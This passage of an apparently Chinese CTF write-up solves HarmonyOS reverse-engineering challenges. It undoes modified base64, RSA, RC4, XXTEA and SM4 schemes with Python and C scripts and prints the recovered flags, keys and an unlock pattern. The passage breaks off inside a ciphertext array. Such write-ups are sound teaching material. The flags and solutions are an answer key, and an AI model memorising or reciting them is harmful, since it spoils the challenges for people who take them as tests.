&#123;        r58 = r9 + x_1_5[r1.byteLength % 3];      &#125;      const r61 = new globalThis.Uint8Array(r58);      if (r30) &#123;        r61[r58 - 1] = 61;        r61[r58 - 2] = 61;      &#125;      r85 = 0;      r86 = 0;      while (true) &#123;        if (r85 + 3 &gt;= r1.byteLength) &#123;          r61[r86] = r44[r1[r85] &gt;&gt; 2];          r61[r86 + 1] = r44[(r1[r85] &lt;&lt; 4 | r1[r85 + 1] &gt;&gt; 4) &amp; 63];          if (r85 + 1 &lt; r1.byteLength) &#123;            r61[r86 + 2] = r44[(r1[r85 + 1] &lt;&lt; 2 | r1[r85 + 2] &gt;&gt; 6) &amp; 63];          &#125;          if (r85 + 2 &lt; r1.byteLength) &#123;            r61[r86 + 3] = r44[r1[r85 + 2] &amp; 63];          &#125;          return new util_.TextDecoder().decodeToString(r61);        &#125; else &#123;          r61[r86] = r44[r1[r85] &gt;&gt; 2];          r61[r86 + 1] = r44[(r1[r85] &lt;&lt; 4 | r1[r85 + 1] &gt;&gt; 4) &amp; 63];          r61[r86 + 2] = r44[(r1[r85 + 1] &lt;&lt; 2 | r1[r85 + 2] &gt;&gt; 6) &amp; 63];          r61[r86 + 3] = r44[r1[r85 + 2] &amp; 63];          r85 = r85 + 3;          r86 = r86 + 4;        &#125;      &#125;    &#125;; /* export */    x_1_8 = function decode(p1) &#123;      let r23, r24, r112, r113, r123, r157, r158, r168, r197;      const r1 = x_1_2(p1);      const r9 = Math.floor(r1.byteLength * 3) / 4;      const r11 = new globalThis.Uint8Array(r9);      r23 = 0;      r24 = 0;      while (true) &#123;        if (r24 + 4 &gt;= r1.byteLength) &#123;          r112 = r23;          r113 = r24;          if (r1[r24]) &#123;            r112 = r23;            r113 = r24;            if (r1[r24 + 1]) &#123;              r11[r23] = x_1_6[r1[r24]] &lt;&lt; 2 | x_1_6[r1[r24 + 1]] &gt;&gt; 4;              r112 = r23 + 1;              r113 = r24 + 1;            &#125;          &#125;          const r115 = r1[r113];          if (!r115) &#123;            r123 = r115;          &#125; else &#123;            r123 = r1[r113 + 1];          &#125;          r157 = r112;          r158 = r113;          if (r123) &#123;            r157 = r112;            r158 = r113;            if (r1[r113 + 1] !== 61) &#123;              r11[r112] = x_1_6[r1[r113]] &lt;&lt; 4 | x_1_6[r1[r113 + 1]] &gt;&gt; 2;              r157 = r112 + 1;              r158 = r113 + 1;            &#125;          &#125;          const r160 = r1[r158];          if (!r160) &#123;            r168 = r160;          &#125; else &#123;            r168 = r1[r158 + 1];          &#125;          r197 = r157;          if (r168) &#123;            r197 = r157;            if (r1[r158 + 1] !== 61) &#123;              r11[r157] = x_1_6[r1[r158]] &lt;&lt; 6 | x_1_6[r1[r158 + 1]];              r197 = r157 + 1;            &#125;          &#125;          if (r9 === r197) &#123;            return r11;          &#125; else &#123;            return new globalThis.Uint8Array(r11.subarray(0, r197));          &#125;        &#125; else &#123;          r11[r23] = x_1_6[r1[r24]] &lt;&lt; 2 | x_1_6[r1[r24 + 1]] &gt;&gt; 4;          r11[r23 + 1] = x_1_6[r1[r24 + 1]] &lt;&lt; 4 | x_1_6[r1[r24 + 2]] &gt;&gt; 2;          const r72 = r24 + 3;          r11[r23 + 2] = x_1_6[r1[r24 + 2]] &lt;&lt; 6 | x_1_6[r1[r72]];          r23 = r23 + 3;          r24 = r24 + 4;        &#125;      &#125;    &#125;;    decodeToString = function decodeToString(p1) &#123;      return x_1_7(x_1_8(p1));    &#125;; /* export */    return undefined;  &#125; else &#123;    const r20 = r0.charCodeAt(r15);    x_1_4[r15] = r20;    x_1_3[r15] = r20;    x_1_6[r20] = r15;    r15 = r15 + 1;  &#125;&#125;export &#123; decodeToString &#125;;export &#123; encode &#125;;</code></pre><p>就是一个base64，同时还有一个逆序<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250607150411046.png" alt="image-20250607150411046"></p><p><strong>flag{universityofoxford38bad98fa3074dd6adc8cc434f22c48b4d4}</strong></p><hr><h3 id="arkts"><a href="#arkts" class="headerlink" title="arkts"></a>arkts</h3><p>还是简单的一道纯鸿蒙逆向，没有so层的分析，jadx-dev打开，分析pages包下的index，加密逻辑如下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250607131731741.png" alt="image-20250607131731741"></p><p>RSA(魔改)-&gt;RC4(魔改)-&gt;base64(魔改)</p><p>密文如下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250607131839005.png" alt="image-20250607131839005"></p><p>但是rc4的key换了<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250607131912126.png" alt="image-20250607131912126"></p><p>并且rc4改了两处<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250607132000827.png" alt="image-20250607132000827"></p><p>rsa是进行单字节的加密，并且n换了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250607132311898.png" alt="image-20250607132311898"></p><p>base64换表了</p><p>然后就可以解密了<br>先base64</p><pre><code class="language-python">import base64custom_b64chars = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;standard_b64chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;# 创建自定义 -&gt; 标准 base64 字符映射表translate_table = str.maketrans(custom_b64chars, standard_b64chars)# 输入数组data = [&quot;ndG5nZa=&quot;, &quot;nte3ndK=&quot;, &quot;nJy2nJi=&quot;, &quot;mtK0mJG=&quot;, &quot;nde5mZK=&quot;, &quot;mJK5nJK=&quot;,        &quot;ntaXnJu=&quot;, &quot;ndG5nZa=&quot;, &quot;mZC4mtC=&quot;, &quot;nZa5mZe=&quot;, &quot;nJC1nZi=&quot;, &quot;mJK0ntq=&quot;,        &quot;mta4nta=&quot;, &quot;mZm5nW==&quot;, &quot;mZG0mJq=&quot;, &quot;ntCZnZi=&quot;, &quot;nJyYmJe=&quot;, &quot;mJy5ntq=&quot;,        &quot;mtK0nJa=&quot;, &quot;ndK2nJm=&quot;, &quot;ndyXmJe=&quot;, &quot;ntmWnZi=&quot;, &quot;mJK5nJK=&quot;, &quot;nZe0nq==&quot;,        &quot;ndaZmJu=&quot;, &quot;ndqXndm=&quot;, &quot;mtiWnda=&quot;, &quot;nJy2nJi=&quot;, &quot;ndqXndm=&quot;, &quot;mtyZodq=&quot;,        &quot;mtK0mJG=&quot;, &quot;ndy5ndu=&quot;, &quot;ndiZndC=&quot;, &quot;mZK3mJe=&quot;, &quot;ndmYmZG=&quot;, &quot;mJi0nte=&quot;,        &quot;ndK2nJm=&quot;, &quot;mtK0nJa=&quot;]# 解码结果数组decoded_result = []for item in data:    # 替换为标准 Base64 字符    standard_b64 = item.translate(translate_table)    # 解码为原始字节并转为 UTF-8 字符串    decoded = base64.b64decode(standard_b64)    decoded_result.append(decoded.decode(&#39;utf-8&#39;, errors=&#39;replace&#39;))  # 用 replace 防止解码失败print(decoded_result)</code></pre><p>然后rsa</p><pre><code class="language-python">from Crypto.Util.number import *e = 7n = 75067p = 277q = 271phi = (p - 1) * (q - 1)d = inverse(e, phi)c = [    48970, 51749, 66662, 19428, 41939, 29969, 50165, 48970,    37817, 70931, 67572, 29454, 10850, 3397, 38424, 57372,    66221, 26954, 19460, 49663, 46121, 53072, 29969, 7145,    40325, 44143, 12040, 66662, 44143, 16384, 19428, 46945,    42347, 39721, 43238, 22451, 49663, 19460]plaintext_bytes = b&#39;&#39;.join([long_to_bytes(pow(ci, d, n)) for ci in c])print(plaintext_bytes)</code></pre><p>最后rc4</p><pre><code class="language-python">def KSA(key):    S = list(range(256))    j = 0    for i in range(256):        j = (j + S[j] + key[j % len(key)]) % 256        S[i], S[j] = S[j], S[i]    return Sdef PRGA(S):    i = j = 0    while True:        i = (i + 1) % 256        j = (j + S[i]) % 256        S[i], S[j] = S[j], S[i]        K = S[(S[i] + S[j]) % 256]        yield Kdef rc4_decrypt(key: bytes, cipher_bytes: bytes) -&gt; bytes:    S = KSA(list(key))    keystream = PRGA(S)    decrypted = bytes((c - next(keystream)) % 256 for c in cipher_bytes)    return decryptedkey = b&#39;OHCTF2026&#39;ciphertext = b&#39;\x13\x8c_\xf4(\xdd\xbe\x13\x8b\x10\rK\xbb\xef&gt;\xf0\xea\xf8\xe4\xe9\x9f\xed\xdd?\xa0Q\xe2_Q\x04\xf4\x8a\xff-I\x11\xe9\xe4&#39;# 解密plaintext = rc4_decrypt(key, ciphertext)print(&quot;解密结果（字节）:&quot;, plaintext)print(&quot;解密结果（尝试UTF-8）:&quot;, plaintext.decode(errors=&#39;replace&#39;))</code></pre><p><strong>flag{0c7dc7f9d1fe0d1f4dfbdb9454ba733d}</strong></p><hr><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>比较搞的一题，还是先用在线网站进行反编译，先看index，这里面没有什么加密逻辑，就是点击按钮就跳转到lock<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608190328589.png" alt="image-20250608190328589"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608190351437.png" alt="image-20250608190351437"></p><p>然后跳转<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608190411365.png" alt="image-20250608190411365"></p><p>一个图案锁。调用了so层的逻辑进行check<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608190533817.png" alt="image-20250608190533817"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608190638314.png" alt="image-20250608190638314"></p><p>长度大于等9，然后check过了就进入到face</p><pre><code class="language-c">unsigned __int64 __fastcall xxtea(unsigned int *a1)&#123;  unsigned int v1; // eax  unsigned int v2; // r15d  unsigned int v3; // r8d  unsigned int v4; // ebx  unsigned int v5; // r9d  unsigned int v6; // ebp  unsigned int v7; // r14d  unsigned int v8; // ecx  unsigned int v9; // r11d  int v10; // edx  unsigned int v11; // ebx  __int64 v12; // r14  int v13; // r12d  int v14; // ecx  unsigned int v15; // edi  unsigned int v17; // [rsp+8h] [rbp-80h]  unsigned int v18; // [rsp+18h] [rbp-70h]  unsigned int v20; // [rsp+28h] [rbp-60h]  __int128 what; // [rsp+40h] [rbp-48h]  unsigned __int64 v22; // [rsp+50h] [rbp-38h]  v22 = __readfsqword(0x28u);  what = ::what;  v1 = a1[8];  v2 = *a1;  v3 = a1[1];  v4 = a1[4];  v17 = a1[5];  v5 = a1[6];  v6 = a1[2];  v7 = a1[3];  v8 = a1[7];  v9 = 0x9E3779B9;  v10 = -11;  do  &#123;    v18 = v4;    v11 = v7;    v20 = v8;    v12 = (v9 &gt;&gt; 2) &amp; 3;    v13 = *(&amp;what + v12);    v2 += (((v1 &gt;&gt; 5) ^ (4 * v3)) + ((v3 &gt;&gt; 3) ^ (16 * v1))) ^ ((v9 ^ v3) + (v13 ^ v1));    v3 += (((v2 &gt;&gt; 5) ^ (4 * v6)) + ((v6 &gt;&gt; 3) ^ (16 * v2))) ^ ((v9 ^ v6) + (v2 ^ *(&amp;what + ((v9 &gt;&gt; 2) &amp; 3 ^ 1))));    v6 += (((v3 &gt;&gt; 5) ^ (4 * v11)) + ((v11 &gt;&gt; 3) ^ (16 * v3))) ^ ((v9 ^ v11) + (v3 ^ *(&amp;what + ((v9 &gt;&gt; 2) &amp; 3 ^ 2))));    v14 = *(&amp;what + (v12 ^ 3));    v7 = v11 + ((((v6 &gt;&gt; 5) ^ (4 * v18)) + ((v18 &gt;&gt; 3) ^ (16 * v6))) ^ ((v9 ^ v18) + (v6 ^ v14)));    v4 = v18 + ((((v7 &gt;&gt; 5) ^ (4 * v17)) + ((v17 &gt;&gt; 3) ^ (16 * v7))) ^ ((v9 ^ v17) + (v7 ^ v13)));    v15 = (((((((v4 &gt;&gt; 5) ^ (4 * v5)) + ((v5 &gt;&gt; 3) ^ (16 * v4))) ^ ((v9 ^ v5) + (v4 ^ *(&amp;what + ((v9 &gt;&gt; 2) &amp; 3 ^ 1)))))           + v17) &gt;&gt; 5)         ^ (4 * v20))        + ((v20 &gt;&gt; 3)         ^ (16          * (((((v4 &gt;&gt; 5) ^ (4 * v5)) + ((v5 &gt;&gt; 3) ^ (16 * v4))) ^ ((v9 ^ v5) + (v4 ^ *(&amp;what + ((v9 &gt;&gt; 2) &amp; 3 ^ 1)))))           + v17)));    v17 += (((v4 &gt;&gt; 5) ^ (4 * v5)) + ((v5 &gt;&gt; 3) ^ (16 * v4))) ^ ((v9 ^ v5) + (v4 ^ *(&amp;what + ((v9 &gt;&gt; 2) &amp; 3 ^ 1))));    v5 += v15 ^ ((v9 ^ v20) + (v17 ^ *(&amp;what + ((v9 &gt;&gt; 2) &amp; 3 ^ 2))));    v8 = v20 + ((((v5 &gt;&gt; 5) ^ (4 * v1)) + ((v1 &gt;&gt; 3) ^ (16 * v5))) ^ ((v9 ^ v1) + (v5 ^ v14)));    v1 += (((v8 &gt;&gt; 5) ^ (4 * v2)) + ((v2 &gt;&gt; 3) ^ (16 * v8))) ^ ((v9 ^ v2) + (v8 ^ v13));    v9 -= 0x61C88647;    ++v10;  &#125;  while ( v10 );  a1[1] = v3;  *a1 = v2;  a1[2] = v6;  a1[3] = v7;  a1[4] = v4;  a1[5] = v17;  a1[7] = v8;  a1[6] = v5;  a1[8] = v1;  return __readfsqword(0x28u);&#125;</code></pre><p>魔改的xxtea，采用爆破进行求解</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;// 核心加密函数（逻辑源自变种TEA）unsigned int qwq(unsigned int *a) &#123;    unsigned int v2 = a[0];    unsigned int v3 = a[1];    unsigned int v6 = a[2];    unsigned int v7 = a[3];    unsigned int v4 = a[4];    unsigned int v17 = a[5];    unsigned int v5 = a[6];    unsigned int v8 = a[7];    unsigned int v1 = a[8];    unsigned int k[4] = &#123;0x0b, 0x2d, 0x0e, 0x01BF52&#125;;    unsigned int delta = 0x9E3779B9;    int rounds = 11;  // 0xFFFFFFF5 == -11 → 共进行 12 轮    while (rounds++) &#123;        unsigned int t0 = (delta &gt;&gt; 2) &amp; 3;        unsigned int k0 = k[t0];        unsigned int k1 = k[t0 ^ 1];        unsigned int k2 = k[t0 ^ 2];        unsigned int k3 = k[t0 ^ 3];        v2 += (((v1 &gt;&gt; 5) ^ (v3 &lt;&lt; 2)) + ((v3 &gt;&gt; 3) ^ (v1 &lt;&lt; 4))) ^ ((delta ^ v3) + (k0 ^ v1));        v3 += (((v2 &gt;&gt; 5) ^ (v6 &lt;&lt; 2)) + ((v6 &gt;&gt; 3) ^ (v2 &lt;&lt; 4))) ^ ((delta ^ v6) + (v2 ^ k1));        v6 += (((v3 &gt;&gt; 5) ^ (v7 &lt;&lt; 2)) + ((v7 &gt;&gt; 3) ^ (v3 &lt;&lt; 4))) ^ ((delta ^ v7) + (v3 ^ k2));        v7 += (((v6 &gt;&gt; 5) ^ (v4 &lt;&lt; 2)) + ((v4 &gt;&gt; 3) ^ (v6 &lt;&lt; 4))) ^ ((delta ^ v4) + (v6 ^ k3));        v4 += (((v7 &gt;&gt; 5) ^ (v17 &lt;&lt; 2)) + ((v17 &gt;&gt; 3) ^ (v7 &lt;&lt; 4))) ^ ((delta ^ v17) + (v7 ^ k0));        unsigned int t1 = (((((v4 &gt;&gt; 5) ^ (v5 &lt;&lt; 2)) + ((v5 &gt;&gt; 3) ^ (v4 &lt;&lt; 4))) ^ ((delta ^ v5) + (v4 ^ k1))) + v17);        unsigned int t2 = ((t1 &gt;&gt; 5) ^ (v8 &lt;&lt; 2)) + ((v8 &gt;&gt; 3) ^ (t1 &lt;&lt; 4));        v17 += (((v4 &gt;&gt; 5) ^ (v5 &lt;&lt; 2)) + ((v5 &gt;&gt; 3) ^ (v4 &lt;&lt; 4))) ^ ((delta ^ v5) + (v4 ^ k1));        v5 += t2 ^ ((delta ^ v8) + (v17 ^ k2));        v8 += (((v5 &gt;&gt; 5) ^ (v1 &lt;&lt; 2)) + ((v1 &gt;&gt; 3) ^ (v5 &lt;&lt; 4))) ^ ((delta ^ v1) + (v5 ^ k3));        v1 += (((v8 &gt;&gt; 5) ^ (v2 &lt;&lt; 2)) + ((v2 &gt;&gt; 3) ^ (v8 &lt;&lt; 4))) ^ ((delta ^ v2) + (v8 ^ k0));        delta -= 0x61C88647;    &#125;    a[0] = v2;    a[1] = v3;    a[2] = v6;    a[3] = v7;    a[4] = v4;    a[5] = v17;    a[6] = v5;    a[7] = v8;    a[8] = v1;    return 0;&#125;// 辅助函数：交换两个整数void swap(unsigned int *a, unsigned int *b) &#123;    unsigned int tmp = *a;    *a = *b;    *b = tmp;&#125;// 辅助函数：反转数组片段void reverse(unsigned int *arr, int start, int end) &#123;    while (start &lt; end) &#123;        swap(&amp;arr[start++], &amp;arr[end--]);    &#125;&#125;// 生成下一个排列int next_permutation(unsigned int *arr, int n) &#123;    int i = n - 2;    while (i &gt;= 0 &amp;&amp; arr[i] &gt; arr[i + 1]) i--;    if (i &lt; 0) return 0;    int j = n - 1;    while (arr[j] &lt; arr[i]) j--;    swap(&amp;arr[i], &amp;arr[j]);    reverse(arr, i + 1, n - 1);    return 1;&#125;int main() &#123;    unsigned int target[9] = &#123;        0x6f7debd3, 0x2654ecea, 0x04f513e0,        0x26d15f03, 0xe9eb51a5, 0x5e0b6099,        0xbc7051b4, 0x3f5f2322, 0x035abc2f    &#125;;    unsigned int perm[9] = &#123;0, 1, 2, 3, 4, 5, 6, 7, 8&#125;;    unsigned int tmp[9];    int attempts = 0;    do &#123;        memcpy(tmp, perm, sizeof(tmp));        qwq(tmp);        if (memcmp(tmp, target, sizeof(tmp)) == 0) &#123;            printf(&quot;Found match after %d tries:\n&quot;, attempts);            for (int i = 0; i &lt; 9; i++) &#123;                printf(&quot;%d&quot;, perm[i]);            &#125;            printf(&quot;\n&quot;);            break;        &#125;        attempts++;    &#125; while (next_permutation(perm, 9));    return 0;&#125;</code></pre><p>拿到解锁的序列042137586，图案锁里的对应关系如下<br>012<br>345<br>678<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608191128982.png" alt="image-20250608191128982"></p><p>解锁成功，跟进</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608191145790.png" alt="image-20250608191145790"></p><p>这就是face，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608191223413.png" alt="image-20250608191223413"></p><p>逻辑就是需要上传一张图片，这张图片进行魔改的sm4加密之后，再base64编码，要和recourses&#x2F;rawfile目录下的enc一致，加密逻辑都在so层</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608191412220.png" alt="image-20250608191412220"></p><p>魔改了不少地方，解密如下</p><p>先对enc文件进行解码<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608191646610.png" alt="image-20250608191646610"></p><p>然后提取出来进行解密</p><pre><code class="language-c">#define _CRT_SECURE_NO_WARNINGS 1#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;typedef uint32_t word_t;typedef uint8_t byte_t;byte_t substitution_box[256] = &#123;     0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6,  0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76,  0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86,  0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A,  0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3,  0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA,  0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73,  0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8,  0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB,  0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E,  0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21,  0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52,  0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF,  0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE,  0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34,  0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3,  0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29,  0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45,  0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C,  0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F,  0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1,  0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12,  0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96,  0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84,  0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE,  0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48&#125;;word_t fixed_key[4] = &#123; 0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC &#125;;word_t constant_key[32] = &#123;    // 这里填入SM4常量CK数组32元素，示例：    0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279&#125;;word_t substitute_word(word_t input) &#123;    byte_t bytes[4];    bytes[0] = (input &gt;&gt; 24) &amp; 0xFF;    bytes[1] = (input &gt;&gt; 16) &amp; 0xFF;    bytes[2] = (input &gt;&gt; 8) &amp; 0xFF;    bytes[3] = input &amp; 0xFF;    return (substitution_box[bytes[0]] &lt;&lt; 24) |            (substitution_box[bytes[1]] &lt;&lt; 16) |            (substitution_box[bytes[2]] &lt;&lt; 8) |            substitution_box[bytes[3]];&#125;word_t rotate_left(word_t value, short bits) &#123;    bits = bits % 32;    return (value &lt;&lt; bits) | (value &gt;&gt; (32 - bits));&#125;word_t linear_transform_1(word_t value) &#123;    return value ^ rotate_left(value, 2) ^ rotate_left(value, 10) ^ rotate_left(value, 18) ^ rotate_left(value, 24);&#125;word_t linear_transform_2(word_t value) &#123;    return value ^ rotate_left(value, 13) ^ rotate_left(value, 23);&#125;word_t transform(word_t value, short mode) &#123;    if (mode == 1)        return linear_transform_1(substitute_word(value));    else        return linear_transform_2(substitute_word(value));&#125;void extend_first(word_t master_key[], word_t working_key[]) &#123;    for (int i = 0; i &lt; 4; i++) &#123;        working_key[i] = master_key[i] ^ fixed_key[i];    &#125;&#125;void extend_second(word_t round_key[], word_t working_key[]) &#123;    for (int i = 0; i &lt; 32; i++) &#123;        working_key[(i + 4) % 4] = working_key[i % 4] ^             transform(working_key[(i + 1) % 4] ^ working_key[(i + 2) % 4] ^                      working_key[(i + 3) % 4] ^ constant_key[i], 2);        round_key[i] = working_key[(i + 4) % 4];    &#125;&#125;void iterate_rounds(word_t state[], word_t round_key[]) &#123;    for (int i = 0; i &lt; 32; i++) &#123;        word_t tmp = transform(state[(i + 1) % 4] ^ state[(i + 2) % 4] ^                              state[(i + 3) % 4] ^ round_key[i], 1);        state[(i + 4) % 4] = state[i % 4] ^ tmp ^ 0x9E3779B9;    &#125;&#125;void reverse_state(word_t input[], word_t output[]) &#123;    for (int i = 0; i &lt; 4; i++) &#123;        output[i] = input[3 - i];    &#125;&#125;void encrypt_sm4(word_t state[], word_t round_key[], word_t output[]) &#123;    iterate_rounds(state, round_key);    reverse_state(state, output);&#125;void decrypt_sm4(word_t state[], word_t round_key[], word_t output[]) &#123;    word_t reversed_round_key[32];    for (int i = 0; i &lt; 32; i++) &#123;        reversed_round_key[i] = round_key[31 - i];    &#125;    iterate_rounds(state, reversed_round_key);    reverse_state(state, output);&#125;void generate_round_keys(word_t master_key[], word_t working_key[], word_t round_key[]) &#123;    extend_first(master_key, working_key);    extend_second(round_key, working_key);&#125;int main(void) &#123;    word_t ciphertext[11316] = &#123; 0xe7ab720b,0x2aa7c124,0x6897c916,0xab7bdd66,0x9a03b0ff,0xe3548db9,0x56eabb72,0x6d54dab1,0xc29c3159,0x7805196a,0x0fc08c6d,0xf5828137,0xcd069838,0x8741610a,0xb021b409,0x5a0a727a,0x6860442d,0xdbdc9302,0x2328e7ce,0xaeec4798,0x8a29a4b8,0x142de0b7,0xd81a12cd,0x74b1a720,0x554025cc,0x73df9e1a,0x8dc9b5ab,0xed0cc9c6,0x17552837,0x3db0cd2b,0xa7ac27dc,0x93fef0d4,0x70b44856,0xe9e98bbd,0x25bc35e4,0x53b85a9e,0x8d7cbf4f,0x8606143c,0x6b84c022,0x3412571e,0x17552837,0x3db0cd2b,0xa7ac27dc,0x93fef0d4,0x17552837,0x3db0cd2b,0xa7ac27dc,0x93fef0d4,0x17552837,0x3db0cd2b,0xa7ac27dc,0x93fef0d4,0x17552837,0x3db0cd2b,0xa7ac27dc,0x93fef0d4,0x8cc050f4,0x6c9265bd,0x06793a77,0x41c011c9,0x3849c2e8,0x7385a432,0xd3dfe39b,0x9586ebd5,0x84463e84,0xfac4a457,0xe3e8046b,0x2a3ee482,0x660a1e64,0x97f3f379,0x4ee18270,0x556eb540,0xa5c8810b,0xcc5f6522,0x392a9d3b,0x9afdc521,0x77bdd08f,0x4f4d43e4,0xd8d49b66,0xe47ecc20,0xb375a227,0x50db12fc,0x0270b9a0,0x4064b18f,0x03df45f4,0x9837adc0,0x66aca7b7,0xdc0e1506,0x12063541,0x650efd1c,0x685d428c,0x2f3f3c6e,0xd4bf4472,0x4d8bca1b,0x70078468,0x3cd03ade,0x46700f06,0xf0d2b368,0x5845d8ba,0xa058c0dd,0x2ceb4a8e,0xc036b614,0xa9de6596,0xf9ca793c,0xc7b80e86,0xd9aba1e5,0x805576e2,0x43fb0d1b,0x0525cc7f,0xe066bfbe,0xa584c939,0xbfb63066,0xdba01c95,0x9e501935,0x656aea62,0x223ec444,0x2a4d589d,0xb5319996,0x3998e876,0xe086731d,0xc7b02781,0x93398f12,0x12943ef3,0xb5fbb96f,0x9b918bab,0x1b570f80,0xbef26c41,0xece45986,0xa98bf6d3,0x5baddf0d,0x8599e8ee,0x539c04bb,0x01664fb6,0x467c9bfd,0x97a7ad3e,0xb67605f9,0x809a007a,0xdaccc1dc,0x31e1efc2,0xa411bcff,0x3de7ab13,0x1e36663d,0x212e6c97,0xbba4d774,0x26c3ad7a,0x0569c01b,0x8b692182,0x10ec63b7,0x46700f06,0xf0d2b368,0x5845d8ba,0xa058c0dd,0x2c2b04da,0x9f7c7a6f,0xedeacc91,0x1d7424c4,0xb5b1df05,0x56740975,0x22c928c9,0x1d1eddd2,0x147a0359,0xef1361ae,0xb1833314,0x8e3ffadf,0x65355e62,0x06df633a,0x51001609,0x0aa3bec5,0x4be30727,0xdb6354d1,0x743b7c92,0x745cb3f2,0x6df107be,0x05a2819d,0xe0daa17c,0x3b601e6e,0x215ec20a,0xa3660910,0x3b515f42,0x3b75715c,0xa2820f94,0x0d5200f0,0x34f924e3,0x7c7ad07c,0xafdc2c4f,0x30c9c055,0x35bfd992,0x8bbdcf50,0x0487910a,0x1f63d8d3,0xd3c6a78b,0xe857973c,0x52fb2772,0x41e6e631,0xc5f42b40,0x497700b3,0x7673fea8,0x2813ecb0,0xb79f5ca4,0x1d329096,0x7673fea8,0x2813ecb0,0xb79f5ca4,0x1d329096,0x7673fea8,0x2813ecb0,0xb79f5ca4,0x1d329096,0x69c51019,0x6c1da637,0xc289e70c,0x1052c6c2,0x3370a380,0x2dfc8e59,0x9045e9fe,0x98e8a27c,0x803e180f,0x2fe73ea5,0x2bc7071d,0x2f58d2c9,0x0965c816,0xb1f28e93,0x06a9004d,0x20a522a6,0xf39a1881,0x01fbc3db,0x324e930d,0x77d92ced,0x19e69f8b,0x63778dff,0x8255f855,0xda89c909,0xa1135cb0,0x17efab7e,0x67786147,0x7c83c896,0xe544d2a5,0x9a497f85,0xf8411210,0xc766b31e,0x7eb19c6c,0x5b0419f2,0x1d0f70f9,0xb2526796,0x48d51406,0xd2f1be30,0xd9a9a40d,0x4d43ce33,0x4fe55455,0x7013db53,0xc26e9baf,0x5011ca40,0x6a353cff,0x1012071b,0xc6d63c9e,0x26f